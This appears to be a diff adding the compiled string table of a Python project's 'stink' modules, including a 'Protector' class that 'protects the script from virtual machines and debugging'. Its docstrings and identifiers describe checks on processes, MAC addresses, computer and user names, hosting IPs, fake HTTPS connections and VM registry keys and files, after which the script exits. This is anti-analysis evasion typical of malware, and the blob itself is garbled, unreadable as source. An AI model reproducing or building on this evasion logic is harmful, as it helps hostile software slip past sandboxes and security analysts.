+    aMessagea__qualname__a__init__uMessage.__init__Dareturnna__create_message_windowuMessage.__create_message_windowarunuMessage.runTustink\utils\message.pyu<module stink.utils.message>TaselfTaselfwe.stink.utils.protectoraProtectorsadisablea_Protector__protectorsaProtectorConfigaselfa_Protector__configuachoicesaascii_uppercaseaascii_lowercaseadigitsTwku
+        Creates a random string.
+
+        Parameters:
+        - length [int]: string length.
+
+        Returns:
+        - str: Random string.
+        aProcessesaget_processes_listlaTasksu
+        Checks processes of the computer.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bool: True or False.
+        w:afindallu..u%012xagetnodeaMacAddressesu
+        Checks the MAC address of the computer.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bool: True or False.
+        agetenvTacomputernamealoweraComputersu
+        Checks the name of the computer.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bool: True or False.
+        agetuseraUsersu
+        Checks the user of the computer.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bool: True or False.
+        aurlopenaIPUrllTaurlatimeoutareadadecodeTuutf-8astripatrueu
+        Checks if the computer is a server.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bool: True or False.
+        uhttps://stink-a_Protector__generate_random_stringTllu
+        Checks if the user is simulating a fake HTTPS connection.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bool: True or False.
+        aOpenKeyaHKEY_LOCAL_MACHINEuSYSTEM\CurrentControlSet\Services\Disk\EnumaKEY_READa__enter__a__exit__aQueryValueExw0aRegistryEnumsTnnnuSYSTEM\CurrentControlSet\Enum\IDEuSystem\CurrentControlSet\Enum\SCSIaQueryInfoKeyaCardsaDllsu
+        Checks whether virtual machine files exist on the computer.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bool: True or False.
+        avalueu<genexpr>uProtector.__check_virtual_machine.<locals>.<genexpr>aEnumKeyareg_keyaitemaSystemaget_video_cardapathaexistsamethoda_Protector__check_processesastatusaprocessesaalla_Protector__check_mac_addressamac_addressa_Protector__check_computeracomputera_Protector__check_userausera_Protector__check_hostingahostinga_Protector__check_http_simulationahttp_simulationa_Protector__check_virtual_machineavirtual_machineaexitTlaprintu[Protector]: u
+        Launches the protector module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        uProtector.run.<locals>.<genexpr>a__doc__a__file__a__spec__aoriginahas_locationa__cached__areTafindallaListauuidTagetnodearandomTachoicesagetpassTagetuseruurllib.requestTaurlopenastringTaascii_uppercaseaascii_lowercaseadigitsawinregTaOpenKeyaQueryInfoKeyaQueryValueExaEnumKeyaHKEY_LOCAL_MACHINEaKEY_READustink.enumsTaProtectorsustink.modulesTaSystemaProcessesustink.helpers.configTaProtectorConfigustink.utils.protectora__module__u
+    Protects the script from virtual machines and debugging.
+    aProtectora__qualname__Tnaprotectorsa__init__uProtector.__init__Tl
+DalengthareturnOintOstra__generate_random_stringuProtector.__generate_random_stringDareturnOboola__check_processesuProtector.__check_processesa__check_mac_addressuProtector.__check_mac_addressa__check_computeruProtector.__check_computera__check_useruProtector.__check_usera__check_hostinguProtector.__check_hostinga__check_http_simulationuProtector.__check_http_simulationa__check_virtual_machineuProtector.__check_virtual_machineDareturnnarunuProtector.runTustink\utils\protector.pyTa.0aitemTa.0aitemaselfTa.0aitemavalueTa.0avalueareg_keyaitemu<module stink.utils.protector>Ta__class__TaselfTaselfaprocessTaselfareg_keyavalueareg_keysakeyacountaitemTalengthTaselfaprotectorsTaselfachecksacheckaresultwe.
